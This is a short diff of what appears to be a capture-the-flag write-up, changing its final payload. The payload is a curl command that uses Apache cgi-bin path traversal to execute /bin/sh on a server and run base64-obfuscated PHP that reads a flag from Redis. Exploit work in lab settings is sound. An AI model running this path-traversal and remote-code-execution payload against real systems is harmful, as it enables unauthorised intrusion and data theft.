@@ -8,5 +8,5 @@ require '/var/www/html/vendor/autoload.php'; $redis = new Predis\Client('tcp://r
 
 ## Final Payload
 ```
-curl -s --path-as-is -d "echo Content-Type: text/plain; echo; php -r \"eval(base64_decode('cmVxdWlyZSBfX0RJUl9fIC4gJy8uLi92ZW5kb3IvYXV0b2xvYWQucGhwJzsgJHJlZGlzID0gbmV3IFByZWRpc1xDbGllbnQoJ3RjcDovL3JlZGlzOjYzNzknKTsgZWNobyAkcmVkaXMtPmdldCgiZmxhZ19zdXBlcl9pZG9sIik7'));\"" "http://103.144.22.12:5002/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo; php -r \"eval(base64_decode('cmVxdWlyZSAnL3Zhci93d3cvaHRtbC92ZW5kb3IvYXV0b2xvYWQucGhwJzsgJHJlZGlzID0gbmV3IFByZWRpc1xDbGllbnQoJ3RjcDovL3JlZGlzOjYzNzknKTsgZWNobyAkcmVkaXMtPmdldCgiZmxhZ19nd2VqX2FuaW1lIik7Cg=='));\"" "http://103.144.22.12:5002/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
 ```
